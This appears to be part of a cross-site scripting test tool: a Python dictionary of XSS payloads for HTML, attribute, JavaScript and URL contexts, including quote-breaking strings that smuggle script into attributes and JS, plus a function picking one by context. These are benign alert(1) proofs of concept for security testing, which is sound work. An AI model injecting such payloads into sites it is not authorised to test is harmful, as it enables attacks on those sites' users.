PAYLOADS = {
    "html": [
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>"
    ],
    "attr": [
        "\" onmouseover=alert(1) x=\"",
    ],
    "js": [
        "';alert(1);//",
        "\";alert(1);//"
    ],
    "url": [
        "javascript:alert(1)"
    ]
}

def get_payload(context):
    return PAYLOADS.get(context, PAYLOADS["html"])[0]
